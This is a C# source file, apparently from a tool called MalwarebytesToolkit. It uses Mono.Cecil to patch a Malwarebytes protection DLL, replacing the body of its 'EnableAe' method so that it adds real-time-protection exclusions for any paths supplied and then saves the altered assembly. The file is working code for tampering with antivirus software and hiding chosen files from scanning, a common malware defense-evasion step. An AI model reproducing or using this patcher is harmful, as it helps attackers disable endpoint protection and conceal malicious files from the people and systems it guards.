using Mono.Cecil.Cil;
using System.IO;
using System.Linq;

namespace MalwarebytesToolkit.Actions
{
    public class AddExclusionAction : BaseAssemblyAction
    {
        public string DllPath { get; set; }
        public static readonly string _typeName = "Assistant";
        public static readonly string _methodName = "EnableAe";
        private readonly string[] _arguments;

        public AddExclusionAction(string dllPath, string[] argument) : base(dllPath, _typeName, _methodName)
        {
            DllPath = dllPath;
            _arguments = argument;
        }

        public override void Patch()
        {
            if (_typeDefinition == null && _methodDefinition == null)
            {
                return;
            }

            var ilProcessor = _methodDefinition.Body.GetILProcessor();
            ilProcessor.Body.Instructions.Clear();

            var fieldDef = _typeDefinition.Fields.FirstOrDefault(f => f.Name == "_mbamServiceController");
            if (fieldDef == null)
                return;

            var mbamServiceControllerType = ResolveTypeReference(Path.GetDirectoryName(DllPath), "Malwarebytes.Protection.Interop.dll", "Malwarebytes.Protection.Interop", "IMBAMServiceControllerV11");
            var iAEControllerType = ResolveTypeReference(Path.GetDirectoryName(DllPath), "Malwarebytes.Protection.Interop.dll", "Malwarebytes.Protection.Interop", "IAEController");
            var getAeControllerMethod = _assemblyDefinition.MainModule.ImportReference(mbamServiceControllerType.Resolve().Methods.First(m => m.Name == "get_AeController"));
            var startProtectionMethod = _assemblyDefinition.MainModule.ImportReference(iAEControllerType.Resolve().Methods.First(m => m.Name == "StartProtection"));

            var iRtpControllerType = ResolveTypeReference(Path.GetDirectoryName(DllPath), "Malwarebytes.Protection.Interop.dll", "Malwarebytes.Protection.Interop", "IRTPController");
            var getRtpControllerMethod = _assemblyDefinition.MainModule.ImportReference(mbamServiceControllerType.Resolve().Methods.First(m => m.Name == "get_RTPController"));
            var addExclusionMethod = _assemblyDefinition.MainModule.ImportReference(iRtpControllerType.Resolve().Methods.First(m => m.Name == "AddExclusion"));

            if (mbamServiceControllerType == null)
                return;

            ilProcessor.Append(Instruction.Create(OpCodes.Ldarg_0));
            ilProcessor.Append(Instruction.Create(OpCodes.Ldfld, fieldDef));
            ilProcessor.Append(Instruction.Create(OpCodes.Callvirt, getAeControllerMethod));
            ilProcessor.Append(Instruction.Create(OpCodes.Callvirt, startProtectionMethod));

            foreach (string arg in _arguments)
            {
                ilProcessor.Append(Instruction.Create(OpCodes.Ldarg_0));
                ilProcessor.Append(Instruction.Create(OpCodes.Ldfld, fieldDef));
                ilProcessor.Append(Instruction.Create(OpCodes.Callvirt, getRtpControllerMethod));
                ilProcessor.Append(Instruction.Create(OpCodes.Ldc_I4, 1));
                ilProcessor.Append(Instruction.Create(OpCodes.Ldstr, arg));
                ilProcessor.Append(Instruction.Create(OpCodes.Callvirt, addExclusionMethod));
            }

            ilProcessor.Append(Instruction.Create(OpCodes.Ret));

            Save(DllPath);
        }
    }
}
